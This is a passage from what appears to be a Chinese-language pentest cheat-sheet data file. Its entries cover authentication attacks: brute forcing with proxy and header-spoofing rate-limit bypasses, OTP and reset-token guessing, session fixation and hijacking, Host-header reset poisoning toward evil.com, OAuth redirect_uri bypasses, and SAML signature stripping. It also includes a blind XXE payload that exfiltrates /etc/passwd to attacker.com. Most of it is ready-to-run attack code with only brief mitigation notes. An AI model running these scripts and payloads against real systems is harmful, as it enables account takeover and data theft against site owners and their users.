        description: '多字段同时爆破',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'Pitchfork', explanation: '一对一映射爆破', type: 'tool-mode' },
        ]
      },
      {
        title: 'Cluster bomb',
        command: `Burp Intruder: Cluster bomb模式`,
        description: '笛卡尔积爆破',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'Cluster bomb', explanation: '全排列爆破', type: 'tool-mode' },
        ]
      },
      {
        title: '基于响应差异的用户名枚举',
        command: `# 通过响应长度/时间差异枚举有效用户名
# 对比有效 vs 无效用户名的响应:
curl -s -o /dev/null -w "user=admin: code=%{http_code} size=%{size_download} time=%{time_total}s" \
  -d "username=admin&password=wrong" "http://target.com/login"

curl -s -o /dev/null -w "user=xxxxx: code=%{http_code} size=%{size_download} time=%{time_total}s" \
  -d "username=nonexistent_user_xxxxx&password=wrong" "http://target.com/login"

# 批量枚举(注意响应差异):
for user in $(cat /usr/share/seclists/Usernames/top-usernames-shortlist.txt); do
  resp=$(curl -s -o /tmp/resp.txt -w "%{http_code}:%{size_download}:%{time_total}" \
    -d "username=\${user}&password=test" "http://target.com/login")
  echo "\${user}: \${resp}"
  sleep 1
done`,
        description: '通过响应状态码/长度/时间的差异来区分有效和无效用户名',
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-w "%{http_code}:%{size_download}:%{time_total}"', explanation: '输出响应码、响应体大小和响应时间用于对比分析', type: 'parameter' },
          { part: '-o /dev/null', explanation: '丢弃响应体，仅保留统计信息', type: 'parameter' },
          { part: 'sleep 1', explanation: '请求间隔避免触发速率限制', type: 'command' },
        ]
      },
      {
        title: '验证码/OTP爆破与绕过',
        command: `# 场景1: 4-6位数字验证码爆破
# 检测验证码是否有速率限制:
for i in $(seq 1 10); do
  code=$(printf "%06d" $RANDOM | cut -c1-6)
  resp=$(curl -s -o /dev/null -w "%{http_code}" \
    -d "otp=\${code}" "http://target.com/verify-otp")
  echo "Attempt \${i}: otp=\${code} → HTTP \${resp}"
done

# 场景2: 通过修改响应绕过前端验证码校验
# 抓包修改响应 {"success":false} → {"success":true}

# 场景3: 验证码复用(同一验证码多次有效)
# 获取验证码后，用同一验证码尝试不同账户

# 场景4: 验证码泄露在响应中
curl -v -d "phone=13800138000&action=send_code" "http://target.com/api/sms"
# 检查响应头/响应体是否包含验证码`,
        description: '针对OTP验证码的爆破和各种逻辑绕过手法',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'printf "%06d" $RANDOM', explanation: '生成6位随机数字作为验证码猜测', type: 'command' },
          { part: '速率限制检测', explanation: '如果10次请求都返回200则可能无速率限制', type: 'value' },
          { part: '响应修改', explanation: '通过Burp拦截修改服务端响应实现绕过', type: 'value' },
        ]
      },
      {
        title: '分布式暴力破解与IP轮换',
        command: `# 使用代理池进行分布式爆破:
import requests
import itertools
from concurrent.futures import ThreadPoolExecutor

TARGET = "http://target.com/login"
proxies_list = open("proxies.txt").read().splitlines()
usernames = ["admin", "administrator", "root", "test"]
passwords = open("/usr/share/wordlists/rockyou-top1000.txt").read().splitlines()

proxy_cycle = itertools.cycle(proxies_list)

def try_login(combo):
    user, pwd = combo
    proxy = next(proxy_cycle)
    try:
        r = requests.post(TARGET,
            data={"username": user, "password": pwd},
            proxies={"http": proxy, "https": proxy},
            timeout=10,
            headers={"User-Agent": f"Mozilla/5.0 (rv:{hash(proxy)%90+10}.0)"}
        )
        if r.status_code == 302 or "dashboard" in r.text.lower():
            print(f"[+] FOUND: {user}:{pwd} via {proxy}")
            return (user, pwd)
    except: pass
    return None

combos = [(u,p) for u in usernames for p in passwords]
with ThreadPoolExecutor(max_workers=5) as pool:
    results = list(pool.map(try_login, combos))
    found = [r for r in results if r]
    for f in found: print(f"[+] Valid: {f[0]}:{f[1]}")`,
        description: '使用代理池轮换IP避免被封禁，进行分布式暴力破解',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'itertools.cycle(proxies_list)', explanation: '循环使用代理池中的代理', type: 'command' },
          { part: 'ThreadPoolExecutor', explanation: '多线程并发提高爆破速度', type: 'command' },
          { part: 'User-Agent轮换', explanation: '每个代理使用不同UA指纹', type: 'value' },
        ]
      },
    ],
    wafBypass: [
      {
        title: '速率限制绕过(HTTP头伪造)',
        command: `# 通过伪造IP头绕过基于IP的速率限制:
import requests
import random

TARGET = "http://target.com/login"
headers_rotation = [
    "X-Forwarded-For", "X-Real-IP", "X-Originating-IP",
    "X-Remote-Addr", "X-Client-IP", "X-Remote-IP",
    "CF-Connecting-IP", "True-Client-IP", "Forwarded"
]

def brute_with_header_bypass(username, password):
    fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    h = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    for header in headers_rotation:
        h[header] = fake_ip
    r = requests.post(TARGET, data={"username": username, "password": password}, headers=h, timeout=10)
    return r

# 每次请求使用不同伪造IP
passwords = ["admin", "123456", "password", "admin123", "root"]
for pwd in passwords:
    r = brute_with_header_bypass("admin", pwd)
    print(f"admin:{pwd} → {r.status_code} ({len(r.text)})")`,
        description: '通过伪造X-Forwarded-For等HTTP头绕过基于IP的速率限制',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'X-Forwarded-For', explanation: '告诉后端真实客户端IP的代理头，可伪造', type: 'parameter' },
          { part: 'random IP', explanation: '每次生成随机IP绕过基于IP的计数器', type: 'value' },
        ]
      },
      {
        title: '参数污染与大小写绕过',
        command: `# 参数污染绕过:
# 正常请求(被限制):
curl -d "username=admin&password=test" "http://target.com/login"

# 参数重复(某些后端取最后一个值):
curl -d "username=admin&username=admin&password=test" "http://target.com/login"

# JSON格式切换(如果支持):
curl -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"test"}' "http://target.com/login"

# 大小写混淆:
curl -d "Username=admin&Password=test" "http://target.com/login"
curl -d "USERNAME=admin&PASSWORD=test" "http://target.com/login"

# Unicode混淆:
curl -d "username=admin&password=test" "http://target.com/login"

# 额外参数注入:
curl -d "username=admin&password=test&captcha=&token=" "http://target.com/login"

# 不同编码:
curl -d "username=admin&password=test" "http://target.com/login" -H "Content-Type: application/x-www-form-urlencoded; charset=IBM037"`,
            syntaxBreakdown: [
              { part: '# 参数污染绕过:', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共17行', type: 'value' }
            ],
        description: '通过参数污染、格式切换、编码混淆绕过WAF对暴力破解的检测',
        platform: 'all',
      },
    ],
    tutorial: {
      overview: '暴力破解是最基础的攻击方式，通过尝试大量密码组合获取账号权限。',
      vulnerability: '缺乏防爆破机制（验证码、锁定、延时）。',
      exploitation: '使用Hydra或Burp进行自动化尝试',
      mitigation: '实施账号锁定策略，增加验证码',
      difficulty: 'beginner'
    }
  },
  {
    id: 'auth-session',
    name: '会话劫持',
    description: '利用会话管理缺陷劫持或伪造用户会话，获取未授权访问权限',
    category: '认证漏洞',
    subCategory: '会话管理',
    tags: ['auth', 'session', 'hijack'],
    prerequisites: ['目标使用基于Cookie或Token的会话管理', '可以截获或预测会话标识符', '网络通信未完全加密(HTTP)或存在XSS'],
    execution: [
      {
        title: '会话Cookie属性分析',
        command: `# 检测Cookie安全属性
curl -v "http://target.com/login" 2>&1 | grep -i "set-cookie"

# 检查关键属性:
# - HttpOnly: 防止JS读取Cookie
# - Secure: 仅通过HTTPS传输
# - SameSite: 防止CSRF
# - Path/Domain: Cookie作用域
# - Expires/Max-Age: 会话生命周期

# 批量分析Cookie:
curl -c - "http://target.com/login" -d "user=test&pass=test" 2>/dev/null | tail -5`,
        description: '分析目标会话Cookie的安全属性配置',
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'curl -v', explanation: '详细模式显示完整HTTP头', type: 'command' },
          { part: 'Set-Cookie', explanation: '服务端设置Cookie的响应头', type: 'value' },
          { part: 'HttpOnly', explanation: '防止JavaScript通过document.cookie读取', type: 'value' },
          { part: 'curl -c -', explanation: '将Cookie输出到stdout', type: 'command' },
        ]
      },
      {
        title: '会话固定攻击(Session Fixation)',
        command: `# 1. 攻击者获取一个有效的sessionId
curl -c cookies.txt "http://target.com/"
cat cookies.txt | grep -i "session|jsession|phpsess"

# 2. 构造包含固定sessionId的链接诱使受害者登录
# http://target.com/login;jsessionid=ATTACKER_SESSION_ID
# 或通过Set-Cookie注入:
# http://target.com/page?lang=en%0d%0aSet-Cookie:%20PHPSESSID=FIXED_SESSION

# 3. 受害者使用该sessionId登录后，攻击者直接使用同一sessionId
curl -b "PHPSESSID=FIXED_SESSION" "http://target.com/dashboard"`,
        description: '通过预设sessionId使受害者登录后攻击者可以复用该会话',
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'jsessionid=', explanation: 'Java应用的会话标识符', type: 'value' },
          { part: '%0d%0a', explanation: 'CRLF注入用于注入Set-Cookie头', type: 'value' },
          { part: 'curl -b', explanation: '使用指定Cookie发送请求', type: 'command' },
        ]
      },
      {
        title: '会话劫持(HTTP嗅探)',
        command: `# 在同一网络中嗅探HTTP Cookie (需要中间人位置)
# 使用Wireshark过滤:
http.cookie contains "session" or http.cookie contains "PHPSESSID"

# 或使用tcpdump:
tcpdump -i eth0 -A -s 0 'port 80 and (tcp[((tcp[12:1]&0xf0)>>2):4] = 0x436F6F6B)'

# 获取Cookie后直接使用:
curl -b "PHPSESSID=STOLEN_SESSION_ID" "http://target.com/admin/dashboard"`,
        description: '在未加密的HTTP通信中截获会话Cookie',
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'http.cookie contains', explanation: 'Wireshark显示过滤器匹配Cookie字段', type: 'command' },
          { part: 'tcpdump -A', explanation: '以ASCII格式显示数据包内容', type: 'command' },
          { part: '0x436F6F6B', explanation: '"Cook"的十六进制表示，匹配Cookie头', type: 'value' },
        ]
      },
      {
        title: '会话预测(弱随机性)',
        command: `# 批量收集sessionId分析规律
for i in $(seq 1 20); do
  sid=$(curl -sI "http://target.com/" | grep -i "set-cookie" | grep -oP "(?<=PHPSESSID=)[^;]+")
  echo "$i: $sid"
  sleep 0.5
done

# 使用Burp Suite Sequencer分析随机性
# 或Python分析:
# python3 -c "
# import hashlib, time
# # 如果sessionId基于时间戳:
# for t in range(int(time.time())-100, int(time.time())+100):
#     predicted = hashlib.md5(str(t).encode()).hexdigest()
#     print(predicted)
# "`,
        description: '通过收集多个sessionId分析其生成规律，预测有效的会话标识符',
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'grep -oP "(?<=PHPSESSID=)[^;]+"', explanation: '用正则提取PHPSESSID的值', type: 'command' },
          { part: 'Sequencer', explanation: 'Burp Suite的会话随机性分析工具', type: 'value' },
        ]
      },
    ],
    wafBypass: [
      {
        title: 'Cookie Jar溢出与Cookie Tossing',
        command: `# Cookie Jar溢出:
# 设置大量Cookie(超过浏览器上限~50个)使旧Cookie被挤出:
for(let i=0;i<700;i++){document.cookie=\`c\${i}=x;domain=.target.com\`}
# 原有session Cookie被挤出后可注入攻击者的session

# Cookie Tossing(子域注入):
# 从subdomain.target.com设置Cookie:
document.cookie="session=ATTACKER_SID;domain=.target.com;path=/"
# 该Cookie在主域target.com上也生效`,
        description: '通过大量设置Cookie超出浏览器存储上限挤出合法session Cookie，或利用子域名权限向父域注入恶意Cookie实现会话覆盖',
      },
      {
        title: 'SameSite绕过与跨站会话泄露',
        command: `# SameSite=Lax绕过(顶级导航GET请求携带Cookie):
<a href="http://target.com/api/transfer?to=attacker&amount=1000">click</a>
# Lax模式下GET请求会携带Cookie

# SameSite=None利用(需Secure):
# 如果设置了SameSite=None但缺少Secure属性:
# Chrome会拒绝，但旧浏览器可能接受

# 通过window.open绕过:
window.open("http://target.com/api/userinfo")
# 新窗口属于顶级导航，Lax模式下携带Cookie`,
            syntaxBreakdown: [
              { part: '# SameSite=Lax绕过(顶级导航GET请求携带Cookie):', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共9行', type: 'value' }
            ],
        description: '利用SameSite=Lax允许顶级导航GET请求携带Cookie的特性通过链接点击或window.open发起带凭据的跨站请求',
      },
    ],
    tutorial: {
      overview: '会话劫持攻击利用Web应用会话管理中的缺陷来获取已认证用户的会话。常见攻击方式包括：会话固定(预设sessionId)、会话嗅探(HTTP明文传输)、会话预测(弱随机数)、以及通过XSS窃取Cookie。',
      vulnerability: '常见会话管理缺陷：1) Cookie缺少HttpOnly/Secure/SameSite属性 2) 登录后未重新生成sessionId(导致会话固定) 3) sessionId熵值不足可被预测 4) 通过HTTP明文传输会话Cookie 5) 会话无超时或超时过长',
      exploitation: '1) 分析Cookie安全属性 2) 检测会话固定(登录前后sessionId是否变化) 3) 分析sessionId随机性 4) 尝试网络嗅探(HTTP场景) 5) 结合XSS窃取Cookie',
      mitigation: '1) Cookie设置HttpOnly+Secure+SameSite=Strict 2) 登录后必须重新生成sessionId 3) 使用强随机数生成器 4) 全站HTTPS 5) 合理设置会话超时 6) 绑定会话与客户端指纹(IP/UA)',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'auth-password-reset',
    name: '密码重置漏洞',
    description: '绕过密码重置流程',
    category: '认证漏洞',
    subCategory: '逻辑漏洞',
    tags: ['auth', 'password-reset', 'logic'],
    prerequisites: ['密码重置功能存在逻辑缺陷'],
    execution: [
      {
        title: 'Host头投毒',
        command: `# Host头投毒劫持密码重置链接:
# 1. 基础Host头投毒:
POST /forgot-password HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
# 重置链接将变为: http://evil.com/reset?token=xxx

# 2. X-Forwarded-Host投毒:
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

email=victim@target.com

# 3. 双Host头:
POST /forgot-password HTTP/1.1
Host: target.com
Host: evil.com

email=victim@target.com

# 4. 通过Burp Collaborator验证:
Host: BURP-COLLABORATOR-ID.burpcollaborator.net`,
        description: '重置链接指向攻击者域名',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'Host', explanation: 'HTTP Host头', type: 'header' },
        ]
      },
      {
        title: 'Token爆破',
        command: `# 密码重置验证码爆破:
# 1. 发送重置验证码请求:
curl -d "email=victim@target.com" "http://target.com/forgot-password"

# 2. 四位数字验证码爆破(0000-9999):
# Burp Intruder设置:
POST /reset-password HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=victim@target.com&code=§0000§
# Payload: Numbers, From 0, To 9999, Min/Max 4 digits

# 3. 六位验证码爆破(需更多时间):
import requests
for code in range(0, 999999):
    r = requests.post('http://target.com/reset-password',
        data={'email':'victim@target.com','code':f'{code:06d}'})
    if 'success' in r.text or r.status_code == 302:
        print(f'Valid code: {code:06d}')
        break`,
        description: '验证码过短',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'Token', explanation: '重置验证码', type: 'parameter' },
        ]
      },
      {
        title: '密码重置Token可预测性分析',
        command: `# 批量请求密码重置Token分析规律:
import requests
import time
import hashlib

tokens = []
for i in range(10):
    r = requests.post("http://target.com/api/password-reset",
        data={"email": f"test{i}@example.com"})
    # 从邮件API或响应中获取token
    if "token" in r.text:
        import json
        token = json.loads(r.text).get("token", "")
        tokens.append({"time": time.time(), "token": token})
        print(f"Token {i}: {token}")
    time.sleep(0.5)

# 分析Token模式:
for i, t in enumerate(tokens):
    print(f"Token {i}: len={len(t['token'])}, "
          f"hex={'yes' if all(c in '0123456789abcdef' for c in t['token'].lower()) else 'no'}, "
          f"time={t['time']}")

# 检查是否基于时间戳:
for ts in range(int(tokens[0]['time'])-5, int(tokens[0]['time'])+5):
    candidate = hashlib.md5(str(ts).encode()).hexdigest()
    if candidate == tokens[0]['token']:
        print(f"[+] Token is MD5(timestamp)! Predictable!")`,
        description: '分析密码重置Token的生成规律，判断是否可预测',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'hashlib.md5(str(ts).encode())', explanation: '测试Token是否为时间戳的MD5哈希', type: 'command' },
          { part: '批量请求', explanation: '收集多个Token样本用于模式分析', type: 'value' },
        ]
      },
      {
        title: '密码重置流程逻辑缺陷',
        command: `# 1. 参数篡改 - 修改邮箱/手机号:
# 发送重置请求时替换接收邮箱
curl -d "email=victim@target.com&notify_email=attacker@evil.com" \
  "http://target.com/api/password-reset"

# 2. IDOR - 直接使用他人的重置Token/UID:
curl -d "token=VALID_TOKEN&uid=OTHER_USER_ID&new_password=hacked123" \
  "http://target.com/api/password-reset/confirm"

# 3. 步骤跳过 - 直接访问设置新密码页面:
curl -d "uid=123&new_password=test12345" \
  "http://target.com/api/password-reset/set-password"

# 4. Token不失效 - 使用已用过的Token:
curl -d "token=ALREADY_USED_TOKEN&new_password=newpass123" \
  "http://target.com/api/password-reset/confirm"

# 5. 密码重置投毒(Host头注入):
curl -H "Host: evil.com" -H "X-Forwarded-Host: evil.com" \
  -d "email=victim@target.com" "http://target.com/api/password-reset"
# 受害者收到的重置链接: http://evil.com/reset?token=xxx`,
        description: '测试密码重置流程中的各种逻辑漏洞',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'X-Forwarded-Host: evil.com', explanation: 'Host头投毒使重置链接指向攻击者域名', type: 'parameter' },
          { part: 'uid=OTHER_USER_ID', explanation: 'IDOR攻击，篡改用户ID重置他人密码', type: 'value' },
        ]
      },
    ],
    wafBypass: [
      {
        title: 'Host头投毒多种变体绕过',
        command: `# 标准Host头投毒:
curl -H "Host: evil.com" -d "email=victim@target.com" "http://target.com/forgot"

# X-Forwarded-Host(常被Web框架信任):
curl -H "X-Forwarded-Host: evil.com" -d "email=victim@target.com" "http://target.com/forgot"

# 多Host头:
curl -H "Host: target.com" -H "Host: evil.com" -d "email=victim@target.com" "http://target.com/forgot"

# Host中注入端口:
curl -H "Host: target.com@evil.com" -d "email=victim@target.com" "http://target.com/forgot"
curl -H "Host: target.com:evil.com" -d "email=victim@target.com" "http://target.com/forgot"

# 绝对URL覆盖Host:
curl "http://target.com/forgot" -H "Host: evil.com" --request-target "http://target.com/forgot"

# X-Original-URL / X-Rewrite-URL:
curl -H "X-Original-URL: /forgot" -H "Host: evil.com" "http://target.com/forgot"`,
            syntaxBreakdown: [
              { part: '# 标准Host头投毒:', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共13行', type: 'value' }
            ],
        description: 'Host头投毒的多种WAF绕过变体',
        platform: 'all',
      },
      {
        title: 'Token爆破速率限制绕过',
        command: `# IP轮换绕过速率限制:
import requests
import random

def try_token(token, proxy=None):
    headers = {
        "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}",
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ])
    }
    r = requests.post("http://target.com/reset-password",
        data={"token": token, "new_password": "Test123!"},
        headers=headers, timeout=10)
    return r.status_code != 400

# 如果Token是6位数字:
for i in range(0, 1000000):
    token = f"{i:06d}"
    if try_token(token):
        print(f"[+] Valid token: {token}")
        break`,
            syntaxBreakdown: [
              { part: '# IP轮换绕过速率限制:', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共22行', type: 'value' }
            ],
        description: '通过IP头轮换和UA随机化绕过重置Token爆破的速率限制',
        platform: 'all',
      },
    ],
    tutorial: {
      overview: '密码重置漏洞是认证机制中最常见的逻辑缺陷之一，涉及重置令牌可预测、令牌泄露、Host头注入、参数篡改等多种攻击向量。攻击者利用密码重置流程中的设计缺陷，可在不知道原始密码的情况下接管任意用户账号',
      vulnerability: '密码重置流程的常见缺陷包括：重置令牌生成算法可预测(如基于时间戳或用户ID)、令牌未设置过期时间或过期时间过长、令牌使用后未立即失效(可重放)、重置邮件中的链接受Host头控制(Host Header Injection)、重置验证码位数不足可爆破、通过修改用户标识参数可重置他人密码',
      exploitation: '首先分析密码重置流程的完整请求链，测试重置令牌的可预测性(收集多个令牌分析规律)，尝试Host头注入(修改Host为攻击者控制的域名使重置链接指向恶意服务器)，测试参数篡改(同时提交自己的邮箱和目标用户ID)，检查验证码是否可爆破(4-6位数字且无频率限制)',
      mitigation: '使用加密安全的随机数生成重置令牌(至少128位)；令牌设置短有效期(15-30分钟)且使用后立即失效；固定重置邮件中的域名不受Host头影响；验证码至少6位且限制尝试次数；重置操作的用户标识仅从服务端session获取而非客户端参数；记录所有密码重置操作日志并支持异常告警',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'auth-oauth',
    name: 'OAuth漏洞',
    description: 'OAuth认证流程漏洞',
    category: '认证漏洞',
    subCategory: 'OAuth',
    tags: ['auth', 'oauth', 'redirect'],
    prerequisites: ['使用OAuth登录'],
    execution: [
      {
        title: 'CSRF攻击',
        command: `# OAuth CSRF - 强制账号绑定攻击:
# 1. 获取攻击者的OAuth授权码:
#    正常走OAuth流程到callback但不完成
#    截获: http://target.com/callback?code=ATTACKER_CODE

# 2. 构造CSRF页面:
<html>
  <body>
    <img src="http://target.com/callback?code=ATTACKER_CODE">
    <!-- 或使用iframe -->
    <iframe src="http://target.com/callback?code=ATTACKER_CODE" style="display:none"></iframe>
  </body>
</html>

# 3. 受害者访问该页面后，其账号将绑定攻击者的OAuth账号
# 4. 攻击者可通过OAuth登录受害者账号

# 防御检测: 检查授权请求是否携带state参数`,
        description: '缺乏state参数',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'state', explanation: '防CSRF参数', type: 'parameter' },
        ]
      },
      {
        title: 'Redirect URI',
        command: `redirect_uri=http://attacker.com`,
        description: '重定向到攻击者获取Code',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'redirect_uri', explanation: '回调地址', type: 'parameter' },
        ]
      },
      {
        title: 'OAuth State参数缺失/可预测CSRF',
        command: `# 1. 检测state参数是否存在:
# 访问OAuth授权URL，查看是否有state参数
curl -sI "http://target.com/oauth/authorize?client_id=xxx&redirect_uri=http://target.com/callback&response_type=code"

# 2. 如果没有state参数 → CSRF绑定攻击:
# 攻击者用自己的OAuth账号发起授权，获取code
# 构造链接: http://target.com/callback?code=ATTACKER_CODE
# 发给受害者 → 受害者的账户绑定了攻击者的OAuth账号

# 3. 如果state可预测:
# 多次请求获取state值分析规律
for i in $(seq 1 5); do
  state=$(curl -sI "http://target.com/oauth/authorize?client_id=xxx&redirect_uri=http://target.com/callback&response_type=code" | grep -i "location" | grep -oP "state=([^&]+)" | cut -d= -f2)
  echo "State $i: $state"
  sleep 0.5
done`,
        description: '检测OAuth流程中state参数的缺失或可预测性',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'state参数', explanation: 'OAuth中防止CSRF的随机值，缺失则可攻击', type: 'value' },
          { part: 'code=ATTACKER_CODE', explanation: '将攻击者的授权码注入受害者的回调', type: 'value' },
        ]
      },
      {
        title: 'Token窃取与Scope越权',
        command: `# 1. 通过redirect_uri泄露Token:
# implicit flow中Token在URL fragment中:
# http://attacker.com/callback#access_token=xxx
# 使用Referer泄露:
# 如果callback页面有外链，Token会通过Referer泄露

# 2. Scope越权 - 请求更高权限:
curl "http://target.com/oauth/authorize?client_id=xxx&redirect_uri=http://target.com/callback&response_type=code&scope=admin+write+delete"

# 3. Token复用测试 - 用authorization_code换取的Token访问其他API:
TOKEN="stolen_access_token_here"
curl -H "Authorization: Bearer \${TOKEN}" "http://target.com/api/admin/users"
curl -H "Authorization: Bearer \${TOKEN}" "http://target.com/api/admin/settings"
curl -H "Authorization: Bearer \${TOKEN}" "http://other-app.target.com/api/user/info"

# 4. refresh_token窃取后无限续期:
curl -d "grant_type=refresh_token&refresh_token=STOLEN_REFRESH_TOKEN&client_id=xxx" \
  "http://target.com/oauth/token"`,
        description: 'OAuth Token窃取、Scope越权、跨应用Token复用测试',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'scope=admin+write+delete', explanation: '请求超出应用正常权限的Scope', type: 'value' },
          { part: 'refresh_token', explanation: '长期有效的刷新令牌，被窃取后可无限续期', type: 'value' },
        ]
      },
    ],
    wafBypass: [
      {
        title: 'Redirect URI绕过技巧合集',
        command: `# 白名单绕过技巧:

# 1. 子域名绕过(如果白名单用后缀匹配):
redirect_uri=http://evil.target.com/callback
redirect_uri=http://target.com.evil.com/callback

# 2. 路径遍历:
redirect_uri=http://target.com/callback/../../../evil-page
redirect_uri=http://target.com/callback/..%2f..%2f..%2fevil-page

# 3. 参数注入:
redirect_uri=http://target.com/callback?next=http://evil.com
redirect_uri=http://target.com/callback%23@evil.com

# 4. 端口注入:
redirect_uri=http://target.com:8080@evil.com/callback

# 5. URL编码绕过:
redirect_uri=http://target.com%40evil.com/callback
redirect_uri=http://target.com%2540evil.com/callback

# 6. localhost/内网绕过:
redirect_uri=http://127.0.0.1/callback
redirect_uri=http://[::1]/callback

# 7. 开放重定向链:
redirect_uri=http://target.com/redirect?url=http://evil.com`,
            syntaxBreakdown: [
              { part: '# 白名单绕过技巧:', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共20行', type: 'value' }
            ],
        description: '多种redirect_uri白名单绕过技术',
        platform: 'all',
      },
    ],
    tutorial: {
      overview: 'OAuth认证漏洞涵盖OAuth 2.0授权流程中的多种安全缺陷，包括CSRF缺失state参数、授权码泄露、令牌劫持、redirect_uri验证不严格、Client Secret泄露、Scope提升等，可导致用户账号被劫持或敏感资源被未授权访问',
      vulnerability: 'OAuth 2.0实现中的常见缺陷：redirect_uri校验不严格(允许子路径或开放重定向)导致授权码/令牌泄露到攻击者控制的端点、state参数缺失导致CSRF、授权码未与client绑定可被重放、隐式授权(Implicit Grant)中access_token直接暴露在URL fragment中、Client ID/Secret硬编码在前端代码或移动APP中',
      exploitation: '首先完整分析OAuth授权流程(抓包观察authorize和token端点参数)，测试redirect_uri是否可修改为攻击者控制的URL(尝试子路径、URL编码、开放重定向链)，检查state参数是否存在且被验证，分析前端JS和移动APP代码寻找泄露的Client Secret，测试Scope参数是否可被提升获取更多权限',
      mitigation: '严格校验redirect_uri使用精确匹配而非前缀匹配；强制使用state参数防止CSRF并在服务端验证；使用PKCE(Proof Key for Code Exchange)增强授权码流程安全性；避免使用隐式授权模式；Client Secret严格保密不硬编码在客户端；实施令牌绑定和最小权限Scope策略',
      difficulty: 'advanced'
    }
  },
  {
    id: 'auth-saml',
    name: 'SAML漏洞',
    description: 'SAML断言攻击',
    category: '认证漏洞',
    subCategory: 'SAML',
    tags: ['auth', 'saml', 'xml'],
    prerequisites: ['使用SAML SSO'],
    execution: [
      {
        title: 'XML签名绕过',
        command: `# SAML断言篡改 - 删除签名验证:
# 1. 拦截SAML Response(Burp Suite):
# POST /saml/acs 中的SAMLResponse参数

# 2. Base64解码:
echo "SAML_RESPONSE_BASE64" | base64 -d > saml.xml

# 3. 修改断言中的NameID(提权为admin):
# 原始: <NameID>user@target.com</NameID>
# 修改: <NameID>admin@target.com</NameID>

# 4. 删除签名块(删除整个<Signature>...</Signature>):
xmlstarlet ed -d "//*[local-name()='Signature']" saml.xml > saml_modified.xml

# 5. 重新Base64编码并替换:
base64 -w0 saml_modified.xml | xclip -sel clip

# 6. 在Burp中用修改后的值替换SAMLResponse参数`,
        description: 'SAML Raider工具',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'Signature', explanation: 'XML签名', type: 'tag' },
        ]
      },
      {
        title: 'XXE攻击',
        command: `# SAML XXE注入攻击:
# 1. 解码SAML Response后，在XML声明后注入DTD:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response ...>
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>

# 2. 带外数据外泄(Blind XXE):
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>

# evil.dtd内容:
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % payload "<!ENTITY exfil SYSTEM 'http://attacker.com/?d=%data;'>">
%payload;

# 3. Base64编码后替换SAMLResponse参数发送`,
        description: 'SAML基于XML',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'DOCTYPE', explanation: 'XML实体定义', type: 'tag' },
        ]
      },
      {
        title: 'SAML Response篡改与重放',
        command: `# 1. 拦截SAML Response:
# Burp Suite中拦截POST到/saml/acs的请求
# SAMLResponse参数是Base64编码的XML

# 2. 解码并修改:
echo "BASE64_SAML_RESPONSE" | base64 -d > saml_resp.xml

# 3. 修改关键字段:
# - NameID: 修改为目标用户 (admin@target.com)
# - Audience: 确保匹配SP
# - Conditions/NotBefore/NotOnOrAfter: 确保时间有效

# 使用xmlstarlet修改:
xmlstarlet ed -N saml="urn:oasis:names:tc:SAML:2.0:assertion" \
  -u "//saml:NameID" -v "admin@target.com" saml_resp.xml > modified.xml

# 4. 重新编码提交:
cat modified.xml | base64 -w0 > encoded.txt
curl -d "SAMLResponse=$(cat encoded.txt)&RelayState=/" "http://target.com/saml/acs"

# 5. 重放攻击(如果未检查InResponseTo/时间):
# 直接重放之前抓到的有效SAMLResponse
curl -d "SAMLResponse=PREVIOUSLY_CAPTURED&RelayState=/" "http://target.com/saml/acs"`,
        description: 'SAML Response篡改身份信息和重放攻击',
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'NameID', explanation: 'SAML断言中标识用户身份的字段', type: 'value' },
          { part: 'InResponseTo', explanation: '防重放的请求关联字段，缺失检查则可重放', type: 'value' },
          { part: 'xmlstarlet', explanation: 'XML编辑工具，用于修改SAML断言中的值', type: 'command' },
        ]
      },
      {
        title: 'SAML签名绕过高级技术',
        command: `# 1. 签名包装攻击(XSW - XML Signature Wrapping):
# 将签名的断言移到XML其他位置，注入恶意断言
# 有8种XSW攻击变体

